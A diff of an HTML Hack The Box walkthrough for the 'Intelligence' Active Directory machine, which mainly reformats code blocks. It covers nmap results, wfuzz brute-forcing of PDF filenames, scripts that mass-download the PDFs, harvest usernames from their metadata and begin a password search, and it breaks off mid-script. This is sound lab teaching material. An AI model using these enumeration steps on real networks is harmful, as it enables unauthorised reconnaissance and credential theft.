@@ -380,7 +380,7 @@
 <p><img alt="" src="../assets/image-20210705163025884.png" /></p>
 <p>Intelligence was my best HTB Machine yet, where it was realist environment and real life scenario. Intelligence was based in Active Directory Penetration Test and mostly depeneds in enumeration to found a way into the Domain Admin. <strong><a href="https://www.hackthebox.eu/home/users/profile/178681">My HTB profile link</a></strong></p>
 <h2 id="machine-info">Machine Info</h2>
-<p><img alt="" src="/home/kali/.config/Typora/typora-user-images/image-20210704094536818.png" /></p>
+<p><img alt="" src="assets/image-20210704094536818.png" /></p>
 <table>
 <thead>
 <tr>
@@ -400,38 +400,38 @@
 <h1 id="walkthrough">Walkthrough</h1>
 <h2 id="recon">Recon</h2>
 <h3 id="nmap">nmap</h3>
-<pre><code class="language-bash">PORT     STATE SERVICE       REASON  VERSION
-53/tcp   open  domain        syn-ack Simple DNS Plus
-80/tcp   open  http          syn-ack Microsoft IIS httpd 10.0
-|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
-| http-methods: 
-|   Supported Methods: OPTIONS TRACE GET HEAD POST
-|_  Potentially risky methods: TRACE
-|_http-server-header: Microsoft-IIS/10.0
-|_http-title: Intelligence
-88/tcp   open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2021-07-04 20:46:20Z)
-135/tcp  open  msrpc         syn-ack Microsoft Windows RPC
-139/tcp  open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
-389/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
-| ssl-cert: Subject: commonName=dc.intelligence.htb
-| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
-| Issuer: commonName=intelligence-DC-CA/domainComponent=intelligence
-445/tcp  open  microsoft-ds? syn-ack
-464/tcp  open  kpasswd5?     syn-ack
-593/tcp  open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
-636/tcp  open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
-| ssl-cert: Subject: commonName=dc.intelligence.htb
-| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
-| Issuer: commonName=intelligence-DC-CA/domainComponent=intelligence
-3268/tcp open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
-| ssl-cert: Subject: commonName=dc.intelligence.htb
-| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
-| Issuer: commonName=intelligence-DC-CA/domainComponent=intelligence
-3269/tcp open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
-| ssl-cert: Subject: commonName=dc.intelligence.htb
-| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
-Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
-</code></pre>
+<div class="highlight"><pre><span></span><code>PORT     STATE SERVICE       REASON  VERSION
+<span class="m">53</span>/tcp   open  domain        syn-ack Simple DNS Plus
+<span class="m">80</span>/tcp   open  http          syn-ack Microsoft IIS httpd <span class="m">10</span>.0
+<span class="p">|</span>_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
+<span class="p">|</span> http-methods: 
+<span class="p">|</span>   Supported Methods: OPTIONS TRACE GET HEAD POST
+<span class="p">|</span>_  Potentially risky methods: TRACE
+<span class="p">|</span>_http-server-header: Microsoft-IIS/10.0
+<span class="p">|</span>_http-title: Intelligence
+<span class="m">88</span>/tcp   open  kerberos-sec  syn-ack Microsoft Windows Kerberos <span class="o">(</span>server time: <span class="m">2021</span>-07-04 <span class="m">20</span>:46:20Z<span class="o">)</span>
+<span class="m">135</span>/tcp  open  msrpc         syn-ack Microsoft Windows RPC
+<span class="m">139</span>/tcp  open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
+<span class="m">389</span>/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: intelligence.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+<span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc.intelligence.htb
+<span class="p">|</span> Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
+<span class="p">|</span> Issuer: <span class="nv">commonName</span><span class="o">=</span>intelligence-DC-CA/domainComponent<span class="o">=</span>intelligence
+<span class="m">445</span>/tcp  open  microsoft-ds? syn-ack
+<span class="m">464</span>/tcp  open  kpasswd5?     syn-ack
+<span class="m">593</span>/tcp  open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP <span class="m">1</span>.0
+<span class="m">636</span>/tcp  open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: intelligence.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+<span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc.intelligence.htb
+<span class="p">|</span> Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
+<span class="p">|</span> Issuer: <span class="nv">commonName</span><span class="o">=</span>intelligence-DC-CA/domainComponent<span class="o">=</span>intelligence
+<span class="m">3268</span>/tcp open  ldap          syn-ack Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: intelligence.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+<span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc.intelligence.htb
+<span class="p">|</span> Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
+<span class="p">|</span> Issuer: <span class="nv">commonName</span><span class="o">=</span>intelligence-DC-CA/domainComponent<span class="o">=</span>intelligence
+<span class="m">3269</span>/tcp open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: intelligence.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+<span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc.intelligence.htb
+<span class="p">|</span> Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
+Service Info: Host: DC<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+</code></pre></div>
 <p>By looking into <code>nmap</code> scanning results, we will discover that the host is Domain Controller. Furthermore, port 80, 139, 445 are opened so we can enumerate web service and SMB shared folders. </p>
 <h2 id="web-enumeration">Web Enumeration</h2>
 <p>During inspecting the web application, we will identify a new directory <code>/documents</code> that contains multiple PDF files. Two documents can be identify if we hover over download button: <code>http://10.10.10.248/documents/2020-01-01-upload.pdf</code> and <code>http://10.10.10.248/documents/2020-12-15-upload.pdf</code> </p>
@@ -446,128 +446,128 @@ Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
 <ol>
 <li>I used the following command to create a sequence of 4 digits and insert <code>-</code> in the middle: </li>
 </ol>
-<p><code>bash
-   seq -w 0000 9999 | sed 's/../&amp;-/' &gt; nums</code></p>
+<div class="highlight"><pre><span></span><code>seq -w <span class="m">0000</span> <span class="m">9999</span> <span class="p">|</span> sed <span class="s1">&#39;s/../&amp;-/&#39;</span> &gt; nums
+</code></pre></div>
 <ol>
 <li>Then, I run <code>wfuzz</code> to fuzz target URL with my created list of 4 digits: </li>
 </ol>
-<p><code>bash
-   wfuzz -c -z file,nums -f output.json,json --sc 200 http://10.10.10.248/documents/2020-FUZZ-upload.pdf</code></p>
+<div class="highlight"><pre><span></span><code>wfuzz -c -z file,nums -f output.json,json --sc <span class="m">200</span> http://10.10.10.248/documents/2020-FUZZ-upload.pdf
+</code></pre></div>
 <p><img alt="" src="../assets/image-20210704221518718.png" /></p>
 <ol>
 <li>After that, collected all valid documents and I made a Python script to auto download the valid documents:</li>
 </ol>
-<pre><code class="language-python">   import requests
-   from multiprocessing.pool import ThreadPool
+<div class="highlight"><pre><span></span><code>   <span class="kn">import</span> <span class="nn">requests</span>
+   <span class="kn">from</span> <span class="nn">multiprocessing.pool</span> <span class="kn">import</span> <span class="n">ThreadPool</span>
 
-   def download_url(url):
-     print(&quot;downloading: &quot;,url)
+   <span class="k">def</span> <span class="nf">download_url</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
+     <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;downloading: &quot;</span><span class="p">,</span><span class="n">url</span><span class="p">)</span>
 
-     file_name_start_pos = url.rfind(&quot;/&quot;) + 1
-     file_name = url[file_name_start_pos:]
+     <span class="n">file_name_start_pos</span> <span class="o">=</span> <span class="n">url</span><span class="o">.</span><span class="n">rfind</span><span class="p">(</span><span class="s2">&quot;/&quot;</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span>
+     <span class="n">file_name</span> <span class="o">=</span> <span class="n">url</span><span class="p">[</span><span class="n">file_name_start_pos</span><span class="p">:]</span>
 
-     r = requests.get(url, stream=True)
-     if r.status_code == requests.codes.ok:
-       with open(file_name, 'wb') as f:
-         for data in r:
-           f.write(data)
-     return url
+     <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">stream</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+     <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="n">requests</span><span class="o">.</span><span class="n">codes</span><span class="o">.</span><span class="n">ok</span><span class="p">:</span>
+       <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">file_name</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+         <span class="k">for</span> <span class="n">data</span> <span class="ow">in</span> <span class="n">r</span><span class="p">:</span>
+           <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+     <span class="k">return</span> <span class="n">url</span>
 
 
-   urls = [&quot;http://10.10.10.248/documents/2020-01-04-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-01-02-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-01-01-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-01-10-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-01-22-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-01-30-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-01-25-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-01-23-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-01-20-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-02-11-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-02-28-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-02-24-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-02-23-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-02-17-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-03-04-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-03-05-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-03-12-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-03-21-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-03-17-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-03-13-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-04-04-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-04-02-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-04-23-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-04-15-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-05-07-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-05-03-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-05-01-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-05-24-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-05-29-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-05-21-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-05-20-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-05-17-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-05-11-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-06-21-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-06-30-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-06-28-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-06-25-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-06-26-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-06-22-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-06-15-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-06-14-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-06-12-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-06-08-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-06-04-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-06-07-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-06-03-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-06-02-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-07-08-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-07-06-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-07-02-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-07-24-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-07-20-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-08-20-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-08-19-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-08-09-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-08-01-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-08-03-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-09-05-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-09-04-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-09-02-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-09-06-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-09-29-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-09-27-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-09-22-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-09-16-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-09-11-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-09-13-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-09-30-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-10-05-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-10-19-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-11-10-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-11-06-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-11-03-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-11-01-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-11-13-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-11-11-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-11-30-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-11-24-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-12-15-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-12-10-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-12-30-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-12-28-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-12-24-upload.pdf&quot;,
-           &quot;http://10.10.10.248/documents/2020-12-20-upload.pdf&quot;
-           ]
+   <span class="n">urls</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;http://10.10.10.248/documents/2020-01-04-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-01-02-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-01-01-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-01-10-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-01-22-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-01-30-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-01-25-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-01-23-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-01-20-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-02-11-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-02-28-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-02-24-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-02-23-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-02-17-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-03-04-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-03-05-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-03-12-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-03-21-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-03-17-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-03-13-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-04-04-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-04-02-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-04-23-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-04-15-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-05-07-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-05-03-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-05-01-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-05-24-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-05-29-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-05-21-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-05-20-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-05-17-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-05-11-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-06-21-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-06-30-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-06-28-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-06-25-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-06-26-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-06-22-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-06-15-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-06-14-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-06-12-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-06-08-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-06-04-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-06-07-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-06-03-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-06-02-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-07-08-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-07-06-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-07-02-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-07-24-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-07-20-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-08-20-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-08-19-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-08-09-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-08-01-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-08-03-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-09-05-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-09-04-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-09-02-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-09-06-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-09-29-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-09-27-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-09-22-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-09-16-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-09-11-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-09-13-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-09-30-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-10-05-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-10-19-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-11-10-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-11-06-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-11-03-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-11-01-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-11-13-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-11-11-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-11-30-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-11-24-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-12-15-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-12-10-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-12-30-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-12-28-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-12-24-upload.pdf&quot;</span><span class="p">,</span>
+           <span class="s2">&quot;http://10.10.10.248/documents/2020-12-20-upload.pdf&quot;</span>
+           <span class="p">]</span>
 
-   results = ThreadPool(5).imap_unordered(download_url, urls)
-   for r in results:
-       print(r)
-</code></pre>
+   <span class="n">results</span> <span class="o">=</span> <span class="n">ThreadPool</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span><span class="o">.</span><span class="n">imap_unordered</span><span class="p">(</span><span class="n">download_url</span><span class="p">,</span> <span class="n">urls</span><span class="p">)</span>
+   <span class="k">for</span> <span class="n">r</span> <span class="ow">in</span> <span class="n">results</span><span class="p">:</span>
+       <span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
+</code></pre></div>
 <ol>
 <li>Finally I collected all the users from downloaded documents using <code>exiftool</code>. </li>
 </ol>
-<pre><code class="language-bash">   exiftool 2020-01-01-upload.pdf | grep &quot;Creator&quot; | cut -f 2 -d &quot;:&quot; | cut -f 2 -d &quot; &quot; &gt; users.txt
+<div class="highlight"><pre><span></span><code>   exiftool <span class="m">2020</span>-01-01-upload.pdf <span class="p">|</span> grep <span class="s2">&quot;Creator&quot;</span> <span class="p">|</span> cut -f <span class="m">2</span> -d <span class="s2">&quot;:&quot;</span> <span class="p">|</span> cut -f <span class="m">2</span> -d <span class="s2">&quot; &quot;</span> &gt; users.txt
 
    cat users.txt
    William.Lee
@@ -580,160 +580,160 @@ Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
    Stephanie.Young
    Daniel.Shelton
    ...
-</code></pre>
+</code></pre></div>
 <h4 id="obtain-the-password">Obtain the Password</h4>
 <p>Let's search for the password from documents. Since we have many PDF documents I created another Python script to automate the process of extracting the text from the all downloaded PDF documents: </p>
-<pre><code class="language-python">#!/usr/bin/python3
-import fitz
+<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/python3</span>
+<span class="kn">import</span> <span class="nn">fitz</span>
 
-files = [&quot;2020-01-04-upload.pdf&quot;,
-        &quot;2020-01-02-upload.pdf&quot;,
-        &quot;2020-01-01-upload.pdf&quot;,
-        &quot;2020-01-10-upload.pdf&quot;,
-        &quot;2020-01-22-upload.pdf&quot;,
-        &quot;2020-01-30-upload.pdf&quot;,
-        &quot;2020-01-25-upload.pdf&quot;,
-        &quot;2020-01-23-upload.pdf&quot;,
-        &quot;2020-01-20-upload.pdf&quot;,
-        &quot;2020-02-11-upload.pdf&quot;,
-        &quot;2020-02-28-upload.pdf&quot;,
-        &quot;2020-02-24-upload.pdf&quot;,
-        &quot;2020-02-23-upload.pdf&quot;,
-        &quot;2020-02-17-upload.pdf&quot;,
-        &quot;2020-03-04-upload.pdf&quot;,
-        &quot;2020-03-05-upload.pdf&quot;,
-        &quot;2020-03-12-upload.pdf&quot;,
-        &quot;2020-03-21-upload.pdf&quot;,
-        &quot;2020-03-17-upload.pdf&quot;,
-        &quot;2020-03-13-upload.pdf&quot;,
-        &quot;2020-04-04-upload.pdf&quot;,
-        &quot;2020-04-02-upload.pdf&quot;,
-        &quot;2020-04-23-upload.pdf&quot;,
-        &quot;2020-04-15-upload.pdf&quot;,
-        &quot;2020-05-07-upload.pdf&quot;,
-        &quot;2020-05-03-upload.pdf&quot;,
-        &quot;2020-05-01-upload.pdf&quot;,
-        &quot;2020-05-24-upload.pdf&quot;,
-        &quot;2020-05-29-upload.pdf&quot;,
-        &quot;2020-05-21-upload.pdf&quot;,
-        &quot;2020-05-20-upload.pdf&quot;,
-        &quot;2020-05-17-upload.pdf&quot;,
-        &quot;2020-05-11-upload.pdf&quot;,
-        &quot;2020-06-21-upload.pdf&quot;,
-        &quot;2020-06-30-upload.pdf&quot;,
-        &quot;2020-06-28-upload.pdf&quot;,
-        &quot;2020-06-25-upload.pdf&quot;,
-        &quot;2020-06-26-upload.pdf&quot;,
-        &quot;2020-06-22-upload.pdf&quot;,
-        &quot;2020-06-15-upload.pdf&quot;,
-        &quot;2020-06-14-upload.pdf&quot;,
-        &quot;2020-06-12-upload.pdf&quot;,
-        &quot;2020-06-08-upload.pdf&quot;,
